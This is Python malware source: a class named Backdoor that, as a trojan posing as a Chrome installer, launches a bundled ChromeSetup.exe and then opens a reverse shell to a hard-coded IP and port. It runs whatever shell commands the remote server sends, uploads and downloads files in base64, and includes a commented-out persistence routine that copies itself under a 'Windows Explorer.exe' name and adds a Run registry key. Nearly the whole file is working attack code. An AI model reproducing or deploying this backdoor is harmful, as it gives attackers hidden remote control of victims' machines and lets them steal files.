#!/usr/bin/env python

import socket
import subprocess
import json
import os
import base64
import sys
import shutil
class Backdoor:


    def __init__(self, ip, port):
       # self.become_persistent()
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))

    # def become_persistent(self):
    #     evil_file_location = os.environ["appdata"] + "\\Windows Explorer.exe"
    #     if not os.path.exists(evil_file_location):
    #         shutil.copyfile(sys.executable, evil_file_location)
    #         subprocess.call('reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v test /t REG_SZ /d "' + evil_file_location +'"', shell = True)

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def reliable_receive(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue


    def handle_server_command(self, command):
        try:
            if command[0] == "exit":
                self.end_connection()
            elif command[0] == "cd" and len(command) > 1:
                return self.change_working_directory_to(command[1])
            elif command[0] == "download":
                return self.read_file(command[1])
            elif command[0]   == "upload":
                return self.upload_file(command)
        except:
            return self.execute_system_command(command)

        return self.execute_system_command(command)


    def execute_system_command(self, command):
        try:
            DEVNULL = open(os.devnull, 'wb')
            return subprocess.check_output(command, shell= True, stderr=DEVNULL, stdin=DEVNULL)
        except:
            return "[+] Invalid Command!"

    def upload_file(self, file):
        self.write_file(file[1] ,file[2])
        return "[+] Upload successful"

    def change_working_directory_to(self,path):
        os.chdir(path)
        return "[+] Changing working directory to " + os.getcwd()



    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))



    def run(self):
        while True:
            command = self.reliable_receive()

            command_result = self.handle_server_command(command)

            self.reliable_send(command_result)
        self.connection.close()

    def end_connection(self):
        self.connection.close()
        exit()


file_name = sys._MEIPASS + "\ChromeSetup.exe"
subprocess.Popen(file_name, shell= True)

try:
    my_backdoor = Backdoor("192.168.239.153", 4567)
    my_backdoor.run()
except Exception:
    sys.exit()
